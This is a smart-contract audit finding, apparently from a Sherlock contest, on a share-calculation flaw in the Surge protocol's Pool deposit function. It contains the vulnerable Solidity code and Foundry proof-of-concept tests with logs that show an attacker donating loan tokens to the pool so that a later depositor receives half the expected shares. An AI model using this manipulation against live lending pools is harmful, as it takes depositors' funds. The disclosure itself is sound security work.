SunSec

high

# tokenToShares miscalculation can leads to fund loss

## Summary

## Vulnerability Detail
There is a miscalculation in a pool contract's math `tokenToShares` using in function deposit(), Attacker can manipulated calculation by sending loantoken directly to pool, resulting miscalculated shares. it can lead to a vulnerability that can result in users who deposit can get incorrect shares, resulting in funds loss.
 
## Impact
Share miscalculation can resulting in funds loss.
In short :
```solidity
function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint)
...
 uint256 _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this)); // Attacker can can control this balance.
 uint256 _supplied = _totalDebt + _loanTokenBalance;  // Manipulated _supplied 
 uint256 shares = (_tokenAmount * _sharesTotalSupply) / _supplied; // Miscalculation
```

Check detail and poc below
## Code Snippet
https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307-L326
```solidity
    function deposit(uint amount) external {
        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this)); //@audit attacker can control this balance.
        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();
        (  
            uint _currentTotalSupply,
            uint _accruedFeeShares,
            uint _currentCollateralRatioMantissa,
            uint _currentTotalDebt
        ) = getCurrentState(
            _loanTokenBalance,
            _feeMantissa,
            lastCollateralRatioMantissa,
            totalSupply,
            lastAccrueInterestTime,
            lastTotalDebt
        );

        uint _shares = tokenToShares(amount, (_currentTotalDebt + _loanTokenBalance), _currentTotalSupply, false); //@audit issue in tokenToSahres.
        require(_shares > 0, "Pool: 0 shares");
        _currentTotalSupply += _shares;
```
https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L203
```solidity
    function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {
        if(_supplied == 0) return _tokenAmount;
        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;  //@audit  attacker can manipulated calculation by sending loantoken directly to pool, resulting miscalculated shares.
        if(roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;
        return shares;
    }

```
POC:
Without manipulation, Alice will get expected shares. 
```solidity
function testDepositWithdraw() external {
    uint256 amount = 1000e18;
    MockERC20 collateralToken = new MockERC20(0, 18);
    MockERC20 loanToken = new MockERC20(1010e18, 18);
    loanToken.transfer(address(alice), 10e18);
    Pool pool = factory.deploySurgePool(
      IERC20(address(collateralToken)),
      IERC20(address(loanToken)),
      1e18,
      0.8e18,
      1e15,
      1e15,
      0.1e18,
      0.4e18,
      0.6e18
    );

    //emit log_named_uint("Mint share", pool.tokenToShares(1, 0, 0, false));
    //emit log_named_uint("LoanToken balance", loanToken.balanceOf(address(this)));

    loanToken.approve(address(pool), amount);

    pool.deposit(1e18);
    emit log_named_uint(
      "First 1e18 depost, our total share:",
      pool.balanceOf(address(this))
    );

    vm.prank(alice);
    loanToken.approve(address(pool), 3e18);
    vm.prank(alice);
    pool.deposit(3e18);
    emit log_named_uint(
      "Alice 3e18 deposit, get total share:",
      pool.balanceOf(address(alice))
    );

[PASS] testDepositWithdraw() (gas: 3390891)
Logs:
  _shares: 1000000000000000000
  _currentTotalSupply: 1000000000000000000
  First 1e18 depost, our total share:: 1000000000000000000
  _shares: 3000000000000000000
  _currentTotalSupply: 4000000000000000000
  Alice 3e18 deposit, get total share:: 3000000000000000000
```
Attacker manipulate pool, Alice will get unexpected shares. 
```solidity
function testDepositManipulation() external {
    uint256 amount = 1000e18;
    MockERC20 collateralToken = new MockERC20(0, 18);
    MockERC20 loanToken = new MockERC20(1010e18, 18);
    loanToken.transfer(address(alice), 10e18);
    Pool pool = factory.deploySurgePool(
      IERC20(address(collateralToken)),
      IERC20(address(loanToken)),
      1e18,
      0.8e18,
      1e15,
      1e15,
      0.1e18,
      0.4e18,
      0.6e18
    );

    //emit log_named_uint("Mint share", pool.tokenToShares(1, 0, 0, false));
    //emit log_named_uint("LoanToken balance", loanToken.balanceOf(address(this)));

    loanToken.approve(address(pool), amount);

    pool.deposit(1e18);
    loanToken.transfer(address(pool), 1e18); // manipulated calculation by sending loantoken directly to pool.

    emit log_named_uint(
      "First 1e18 depost, our total share:",
      pool.balanceOf(address(this))
    );

    vm.prank(alice);
    loanToken.approve(address(pool), 3e18);
    vm.prank(alice);
    pool.deposit(3e18);
    emit log_named_uint(
      "Alice 3e18 deposit, get total share:",
      pool.balanceOf(address(alice))
    );
[PASS] testDepositManipulation() (gas: 3392574)
Logs:
  _shares: 1000000000000000000
  _currentTotalSupply: 1000000000000000000
  First 1e18 depost, our total share:: 1000000000000000000
  _shares: 1500000000000000000
  _currentTotalSupply: 2500000000000000000
  Alice 3e18 deposit, get total share:: 1500000000000000000 
//Alice expect to get 3000000000000000000 shares. But because attacker manipulated calculation so Alice only receive 1500000000000000000 shares.

```
## Tool used
Manual Review

## Recommendation
Using total loantoken deposited as `_loanTokenBalance ` calculate in `_supplied `instead of loantokan balance in the pool.
